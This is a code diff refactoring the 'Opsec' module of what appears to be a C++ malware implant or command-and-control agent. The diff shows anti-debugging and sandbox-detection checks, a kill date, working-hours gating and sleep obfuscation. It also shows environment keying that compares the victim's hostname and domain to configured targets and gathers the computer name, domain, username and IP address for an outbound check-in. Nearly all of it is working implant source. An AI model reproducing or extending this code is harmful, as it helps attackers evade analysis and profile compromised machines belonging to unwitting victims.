@@ -9,14 +9,14 @@ namespace Opsec {
             Opsec::SeCheckDebugger();
             if (ntstatus != ERROR_SUCCESS) {
 
-                Random::Timeout(SECONDS(1));
+                Utils::Random::Timeout(SECONDS(1));
                 return_defer(ERROR_BAD_ENVIRONMENT);
             }
 #endif
             Opsec::SeCheckSandbox();
             if (ntstatus != ERROR_SUCCESS) {
 
-                Random::Timeout(SECONDS(1));
+                Utils::Random::Timeout(SECONDS(1));
                 return_defer(ERROR_BAD_ENVIRONMENT);
             }
             break;
@@ -29,13 +29,13 @@ namespace Opsec {
         HEXANE
 
         if (Ctx->Config.Killdate != 0) {
-            if (Utils::GetTimeNow() >= Ctx->Config.Killdate) {
+            if (Utils::Time::GetTimeNow() >= Ctx->Config.Killdate) {
                 Commands::Shutdown(nullptr);
             }
         }
 
         if (Ctx->Config.WorkingHours != 0) {
-            if (!Utils::InWorkingHours()) {
+            if (!Utils::Time::InWorkingHours()) {
                 return FALSE;
             }
         }
@@ -84,7 +84,6 @@ namespace Opsec {
         stats.dwLength = sizeof(stats);
 
         Ctx->win32.GlobalMemoryStatusEx(&stats);
-
         (stats.ullAvailPhys <= 4)
             ? ntstatus = (ERROR_NOT_ENOUGH_MEMORY)
             : ntstatus = (ERROR_SUCCESS);
@@ -93,75 +92,63 @@ namespace Opsec {
     VOID SeCheckEnvironment() {
         HEXANE
 
-        PSTREAM Outbound            = Stream::CreateStreamWithHeaders(TypeCheckin);
-        PIP_ADAPTER_INFO adapter    = { };
-        LPSTR buffer                = { };
-        ULONG length                = 0;
+        PSTREAM entry               = Stream::CreateStreamWithHeaders(TypeCheckin);
+        IP_ADAPTER_INFO adapter     = { };
 
-        if (!Outbound) {
+        char buffer[MAX_PATH]       = { };
+        DWORD length                = MAX_PATH;
+
+        if (!entry) {
             return_defer(ERROR_NO_DATA);
         }
 
-        if (!Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
-            buffer = S_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, R_CAST(LPSTR, buffer), &length)) {
+            if (x_strncmp(Ctx->Config.Hostname, buffer, x_strlen(Ctx->Config.Hostname)) != 0) {
+                return_defer(ERROR_BAD_ENVIRONMENT);
+            }
+            Stream::PackString(entry, buffer);
 
-            if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
-                if (Utils::GetHashFromStringA(Ctx->Config.Hostname, x_strlen(Ctx->Config.Hostname)) != Utils::GetHashFromStringA(buffer, x_strlen(buffer))) {
+        } else {
+            Stream::PackDword(entry, 0);
+        }
+
+        x_memset(buffer, 0, MAX_PATH);
+        length = MAX_PATH;
+
+        if (Ctx->Transport.Domain[0] != NULTERM) {
+            if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, R_CAST(LPSTR, buffer), &length)) {
+                if (x_strncmp(Ctx->Transport.Domain, buffer, x_strlen(Ctx->Transport.Domain)) != 0) {
                     return_defer(ERROR_BAD_ENVIRONMENT);
                 }
-                Stream::PackString(Outbound, buffer);
+                Stream::PackString(entry, buffer);
+
             } else {
-                Stream::PackDword(Outbound, 0);
+                Stream::PackDword(entry, 0);
             }
-            ZeroFreePtr(buffer, length);
         }
 
-        length = 0;
-        if (Ctx->Transport.Domain[0] != NULTERM) {
-            if (!Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {
-                buffer = S_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+        x_memset(buffer, 0, MAX_PATH);
+        length = MAX_PATH;
 
-                if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {
-                    if (Utils::GetHashFromStringA(Ctx->Transport.Domain, x_strlen(Ctx->Transport.Domain)) != Utils::GetHashFromStringA(buffer, x_strlen(buffer))) {
-                        return_defer(ERROR_BAD_ENVIRONMENT);
-                    }
-                    Stream::PackString(Outbound, buffer);
-                } else {
-                    Stream::PackDword(Outbound, 0);
-                }
-                ZeroFreePtr(buffer, length);
-            }
+        if (Ctx->win32.GetUserNameA(R_CAST(LPSTR, buffer), &length)) {
+            Stream::PackString(entry, buffer);
         } else {
-            Stream::PackDword(Outbound, 0);
+            Stream::PackDword(entry, 0);
         }
 
-        length = 0;
-        if (!Ctx->win32.GetUserNameA(buffer, &length)) {
-            buffer = S_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+        x_memset(buffer, 0, length);
+        length = sizeof(adapter);
 
-            if (Ctx->win32.GetUserNameA(buffer, &length)) {
-                Stream::PackString(Outbound, buffer);
-            } else {
-                Stream::PackDword(Outbound, 0);
-            }
-            ZeroFreePtr(buffer, length);
+        if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
+            Stream::PackString(entry, adapter.IpAddressList.IpAddress.String);
+        } else {
+            Stream::PackDword(entry, 0);
         }
 
-        length = 0;
-        if (Ctx->win32.GetAdaptersInfo(adapter, &length)) {
-            adapter = S_CAST(PIP_ADAPTER_INFO, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
-
-            if (Ctx->win32.GetAdaptersInfo(adapter, &length) == NO_ERROR) {
-                Stream::PackString(Outbound, adapter->IpAddressList.IpAddress.String);
-            } else {
-                Stream::PackDword(Outbound, 0);
-            }
-            ZeroFreePtr(adapter, length);
-        }
-
-        Message::OutboundQueue(Outbound);
+        x_memset(&adapter, 0, sizeof(IP_ADAPTER_INFO));
 
     defer:
+        Message::OutboundQueue(entry);
     }
 
     VOID SeImageCheck(PIMAGE img, PIMAGE proc) {
@@ -181,6 +168,6 @@ namespace Opsec {
     }
 
     VOID SleepObf() {
-        Random::Timeout(Random::RandomSleepTime());
+        Utils::Random::Timeout(Utils::Random::RandomSleepTime());
     }
 }
